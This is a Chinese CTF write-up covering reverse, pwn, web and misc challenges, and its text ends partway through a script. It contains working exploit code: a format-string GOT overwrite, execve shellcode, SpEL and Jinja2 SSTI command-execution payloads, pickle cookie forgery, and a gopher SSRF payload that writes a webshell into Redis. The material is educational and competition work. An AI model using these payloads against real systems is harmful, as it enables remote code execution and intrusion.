<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+0h] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">56</span>]; <span class="comment">// [esp+D0h] [ebp-3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_40C015);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  sub_401082(<span class="string">"Please input your flag: "</span>, v5);</span><br><span class="line">  sub_401023(<span class="string">"%s"</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)off_40A040(Str, v3) )</span><br><span class="line">    sub_401082(<span class="string">"Congratulation~~~"</span>, v6);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_401082(<span class="string">"Try again~~~"</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>其实这里的off_40A040（check）函数有点问题，直接点进去发现解出来的是个fake flag，交叉引用发现这个check函数有被更改过，在下面的代码里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __stdcall <span class="title function_">TlsCallback_0_0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  HANDLE v3; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS (__stdcall *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG); <span class="comment">// [esp+D0h] [ebp-20h]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+DCh] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+E8h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_40C015);</span><br><span class="line">  hModule = LoadLibraryW(<span class="string">L"Ntdll.dll"</span>);</span><br><span class="line">  NtQueryInformationProcess = (NTSTATUS (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hModule, <span class="string">"NtQueryInformationProcess"</span>);</span><br><span class="line">  v3 = GetCurrentProcess();</span><br><span class="line">  result = NtQueryInformationProcess(v3, ProcessDebugPort, &amp;v7, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    off_40A040 = (<span class="type">int</span> (__cdecl *)(_DWORD, _DWORD))sub_4011C7;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    off_40A040 = (<span class="type">int</span> (__cdecl *)(_DWORD, _DWORD))j_fini;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>然后进入到正确的check(j_fini)函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">fini_func</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_40C015);</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span>)(((*(_BYTE *)(i + a1) ^ <span class="number">0x55</span>) + <span class="number">4</span>) ^ <span class="number">0x66</span>) != byte_40A000[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>可以解出来flag<br><code>miniLctf{hs_1s_s0_1nt4r4st1ng!!}</code></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn:"></a><strong>Pwn:</strong></h1><h2 id="Baby-Repeater-hs-done"><a href="#Baby-Repeater-hs-done" class="headerlink" title="Baby_Repeater | hs | done"></a>Baby_Repeater | hs | done</h2><p>刚开始pwn，会的东西少，被迫学了如何做开启pie的题、64位的格式化字符串漏洞。<br>主要思想是，先用格式化字符串读取elf二进制文件加载的地址(elf_base)、libc加载的地址(libc_base)。<br>然后用格式化字符串漏洞挟持got表，我的exp里改写了exit函数的got表。<br>挟持got表的时候使用了one_gadget来进行getshell。<br>问题是如果利用格式化字符串漏洞直接向exit的got表写入一个超级大的数字，那么首先就要在shell输出这么多数字，这样做是会出错的，所以将one_gadget的地址拆成三个2字节的数字，再进行写入。</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary_name = <span class="string">"baby_repeater"</span></span><br><span class="line">io = process([<span class="string">"./libc-2.31.so"</span>,<span class="string">"./baby_repeater"</span>],env={<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.31.so"</span>})</span><br><span class="line"><span class="comment">#io = remote("pwn.woooo.tech",10044)</span></span><br><span class="line">elf = ELF(<span class="string">"./baby_repeater"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line">context(binary=<span class="string">"./baby_repeater"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,"b printf")</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"><span class="comment">#fmt_str_offset = 8</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"&gt; "</span>)</span><br><span class="line">sl(<span class="string">"%115$p"</span>)</span><br><span class="line">ru(<span class="string">"Your sentence: "</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x14D5</span></span><br><span class="line">log.info(<span class="string">"elf_base : "</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"&gt; "</span>)</span><br><span class="line">sl(<span class="string">"%111$p"</span>)</span><br><span class="line">ru(<span class="string">"Your sentence: "</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.info(<span class="string">"libc_base : "</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">exit_addr = elf.got[<span class="string">'exit'</span>] + elf_base</span><br><span class="line">one_gadgets = [<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">1</span>] + libc_base</span><br><span class="line">log.info(<span class="string">"one_gatdet : "</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">one1 = (one_gadget &amp; <span class="number">0xffff</span>)-<span class="number">15</span></span><br><span class="line">one2 = ((one_gadget&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>)-<span class="number">15</span></span><br><span class="line">one3 = ((one_gadget&gt;&gt;<span class="number">32</span>) &amp; <span class="number">0xffff</span>)-<span class="number">15</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"one1:"</span>+<span class="built_in">hex</span>(one1+<span class="number">15</span>))</span><br><span class="line">payload = flat([(<span class="string">'%'</span>+<span class="built_in">str</span>(one1)+<span class="string">'c%10$hn'</span>).ljust(<span class="number">16</span>,<span class="string">'A'</span>),</span><br><span class="line">                exit_addr])</span><br><span class="line">ru(<span class="string">"&gt; "</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"one2:"</span>+<span class="built_in">hex</span>(one2+<span class="number">15</span>))</span><br><span class="line">payload = flat([(<span class="string">'%'</span>+<span class="built_in">str</span>(one2)+<span class="string">'c%10$hn'</span>).ljust(<span class="number">16</span>,<span class="string">'A'</span>),</span><br><span class="line">                exit_addr+<span class="number">2</span>])</span><br><span class="line">ru(<span class="string">"&gt; "</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"one3:"</span>+<span class="built_in">hex</span>(one3+<span class="number">15</span>))</span><br><span class="line">payload = flat([(<span class="string">'%'</span>+<span class="built_in">str</span>(one3)+<span class="string">'c%10$hn'</span>).ljust(<span class="number">16</span>,<span class="string">'A'</span>),</span><br><span class="line">                exit_addr+<span class="number">4</span>])</span><br><span class="line">ru(<span class="string">"&gt; "</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"&gt; "</span>)</span><br><span class="line">sl(<span class="string">"exit"</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Shellocde-Loader-hs-done"><a href="#Shellocde-Loader-hs-done" class="headerlink" title="Shellocde_Loader | hs | done"></a>Shellocde_Loader | hs | done</h2><p>这题没出真是太可惜了，裂开</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./shellcode_loader"</span>)</span><br><span class="line">context(binary=<span class="string">"./shellcode_loader"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,"b __isoc99_scanf")</span></span><br><span class="line">shellcode1=<span class="string">"\x48\x31\xc0\x48\x89\xc7\x48\x8d\x75\x10\x0f\x05\xff\xe6"</span></span><br><span class="line">io.sendline(shellcode1)</span><br><span class="line">shellcode2=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">io.sendline(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>shellcode1如下，shellcode2是在网站上找的现成的shellcode。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor rax,rax</span><br><span class="line">mov rdi,rax</span><br><span class="line">lea rsi,[rbp+0x10]</span><br><span class="line">syscall</span><br><span class="line">jmp rsi</span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web:"></a><strong>Web:</strong></h1><h2 id="Java-CyXq-done"><a href="#Java-CyXq-done" class="headerlink" title="Java | CyXq | done"></a>Java | CyXq | done</h2><p>做这道题前，Java负基础(啥也不会,甚至怀疑人生)<br>题目打开给个压缩包，下载下来发现是一个Java的小项目的源文件，把每个都打开看看，感觉比较关键的文件是这个</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> {</span><br><span class="line">    <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping("/")</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">main</span><span class="params">(HttpServletRequest request,<span class="meta">@RequestParam(required = false)</span> String code,<span class="meta">@RequestParam(required = false)</span> String url)</span> <span class="keyword">throws</span> MalformedURLException {</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        <span class="keyword">if</span>(requestURI.equals(<span class="string">"/"</span>)){</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"nonono"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">if</span> (code!=<span class="literal">null</span>) {</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> parser.parseExpression(code).getValue().toString();</span><br><span class="line">                <span class="keyword">return</span> s;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"so?"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>==<strong>代码审计</strong>==<br>比较关键的一些知识点如下：</p>
<ul>
<li>@RequestMapping(‘/‘)</li>
<li>getRequestURI()</li>
<li>equals(“/“)</li>
<li>parser.parseExpression(code).getValue().toString()</li>
</ul>
<p>==<strong>解题思路</strong>==<br>由于代码很少，基础知识了解了，解题的思路也就出来了<br>首先，题目的描述中给了提示：<code>flag在/flag中</code>，利用给出的提示，拿到flag的方式无非有两种，通过命令执行，如<code>cat /flag</code>，或者直接通过文件读取，读取到<code>/flag</code>的内容<br>payload:/?code=T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(‘/flag’), T(java.nio.charset.Charset).defaultCharset())<br><code>flag:miniL{edd0faa3-c21b-40da-ac82-53bf734299c9}</code></p>
<h2 id="L-inc-CyXq-done"><a href="#L-inc-CyXq-done" class="headerlink" title="L inc. | CyXq | done"></a>L inc. | CyXq | done</h2><p> 经过一些尝试，得到题目的第一步应该是认证vip身份<br> 抓包，看到cookie应该是base64:<code>gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==</code><br> 用python解一下：<code>b'\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03cys\x94\x8c\x03vip\x94\x89ub.'</code><br>结合PHP序列化的字符串，这个看起来也像是一个序列化字符串<br>实际上这就是python的序列化字符串，<code>cys</code>前是它的长度<br>用python的pickletools处理一下<br><img src="https://md.wanan.world/uploads/upload_10667b8f37e9704b922233a85cb8dde9.png"><br>注意到<code>\x89</code>是NEWFALSE<br>尝试一下<code>\x90,\x88</code>，可知<code>\x88</code>是NEWTRUE<br>将更改后的字符串base64encode，作为cookie<br>成功认证vip身份<br><img src="https://md.wanan.world/uploads/upload_52a37576e67982552ee86f0e46d3f24f.png"><br>并且可以看到前面的输入回显到了页面上，猜测是SSTI<br>输入<code>{{3*3}}</code>成功回显9<br>这里我做题时没来及的写脚本，所以是直接输入payload，抓包，改包认证vip身份来做题的<br>paylaod:<br><strong>查目录</strong><br><code>gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==</code><br><strong>查flag</strong><br><code>gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu</code><br><img src="https://md.wanan.world/uploads/upload_d6d3bccd12659fac1c8aa23baca7ba63.png"><br><img src="https://md.wanan.world/uploads/upload_f67b42cadb955b527885b7ce39a837e5.png"></p>
<h2 id="Template-CyXq-done"><a href="#Template-CyXq-done" class="headerlink" title="Template | CyXq | done"></a>Template | CyXq | done</h2><p>这题拿了ctf生涯第一个一血<br>看题目名字大概可以确定这是一道模板注入的题目<br>经过简单的测试，可能是通过JS过滤了<code>'{''}''%'</code>,想到调试一下题目JS代码，看看能否去掉过滤(这里稍稍与lt师傅出题时候的想法不一样，相当于走了个小捷径)，<br>进入到JS的源码部分，直接搜索<code>{</code>找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下submit函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用alert()结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。<br>没有JS的过滤了，那么就可以进行模板注入了,首先常规的<code>{{3*3}}</code>得到回显9，应该是jinja2的模板注入<br>经过简单的测试，过滤了<code>'class','base','subclasses','init','flag','os','.','+','|',单引号</code><br>这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的<code>"".__class__.__base__.__subclasses__()</code>链条去执行命令，jinja2有个特性，<code>""["__class__"]=="".__class__</code>，基于此，可以通过”进行字符拼接，利用这个特性绕过.以及关键词的过滤<br>一开始想着用这个链条<code> x["__init__"]["__globals__"]["__getitem__"]("__builtins__")</code>去调用命令执行模块,后来发现想的太简单了,可能由于python版本等诸多原因,这个payload在服务器端是打不通的<br>之后想通过遍历找到可以执行命令的模块,写了这个payload:<code>{% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %}
{% if c["__na""me__"] == "catch_warnings" %}
{{c["__in"it__"]["__getitem__"]["__globals__"]["__builtins__"]["eval"]("__import__(\"o\"\"s\")[\"system\"](\"ls /\")") }}
{% endif %}
{% endfor %}</code>但是可能由于相同的原因,这个payload也打不通<br>最后没办法只好通过手撕去查找,题目能利用的模块,我是用这个链条完全的手撕…(主要是最开始做题目虽然走了捷径,但也把思路禁锢在了直接在输入框中进行注入,没有想到抓包,写脚本跑一下)<code>{{""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[0]}}</code>最后得到<br><img src="https://md.wanan.world/uploads/upload_94f34288d38dac39001673f52d59b64b.png"><br>找到了可以执行命令的模块就什么都好说了<br>最终payload:<br><code>{{""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("ls /")["read"]()}}</code><br><img src="https://md.wanan.world/uploads/upload_a60b7469307a4d305c1ae59e79754fe6.png"><br><code>{{""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /f*")["read"]()}}</code></p>
<h2 id="protocol-CyXq-done"><a href="#protocol-CyXq-done" class="headerlink" title="protocol | CyXq | done"></a>protocol | CyXq | done</h2><p>题目打开，是一个提示可以输入URL的框，猜测考察SSRF<br>进行简单的手动测试，得到过滤了<code>file://</code>,<code>dict</code>,<code>localhost</code>,<code>../</code><br><code>file://</code>被过滤了，可以尝试<code>file:/</code>去绕过<br>POST传参，<code>url=file:/var/www/html/index.php</code><br>得到了页面的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>{  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'url'</span>])){</span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">'url'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span>, <span class="variable">$url</span>,<span class="variable">$match</span>)) {</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'这样子可不行哦'</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'minisecret'</span>])){</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">'ifconfig eth1'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>POST，minisecret会执行<code>ifconfig eth1</code>，让我们查看到相应的网卡信息<br><img src="https://md.wanan.world/uploads/upload_25a0e665bf7591c2ad5f4ea7fde5634d.png"><br>由此也得到了另一台主机的内网地址，访问一下，是可以访问通的，但什么都没有。尝试手动测试一下，同一网段下是否还有其他可访问的主机，172.192.97.3/4/5 都试了一下。可以访问的是172.192.97.3<br><img src="https://md.wanan.world/uploads/upload_5423e7b0c4619ac339ffdee660f14b62.png"><br>由于gopher协议是没有被过滤的，可以首先测试一下3306(mysql)以及6379(redis)是否开启服务，得到redis是有服务的<br>那么解决办法就是利用gopher协议去打redis，最终得到flag<br>起初想写入Webshell，然后用工具去连接，但这是不行的，已知的ip应该是一个内网ip，无法通过蚁剑等从外部连接<br>所以就想能否直接在shell中通过执行命令把flag查出来并回显<br>运行生成payload的工具<code>gopherus</code>,写入<code>&lt;?php system('cat /f*'); ?&gt;</code>(这里基于前几题的flag位置进行了一点猜测)<br>payload：<code>url=gopher://172.192.97.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3F%20system%28%27cat%20/f%2A%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code><br>再利用SSRF访问172.192.97.3/shell.php，成功得到回显<br><img src="https://md.wanan.world/uploads/upload_ad9e6c4927c71fa317adc882552e77ad.png"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a><strong>Misc:</strong></h1><h2 id="好白给的签到题-dbt-done"><a href="#好白给的签到题-dbt-done" class="headerlink" title="好白给的签到题 | dbt | done"></a>好白给的签到题 | dbt | done</h2><p>5140w 字符 离谱….cao…但是发现是base64解码…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> read</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r'.\story.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c = f.read().strip()</span><br><span class="line">s = c</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b64decode(s)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            s = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span 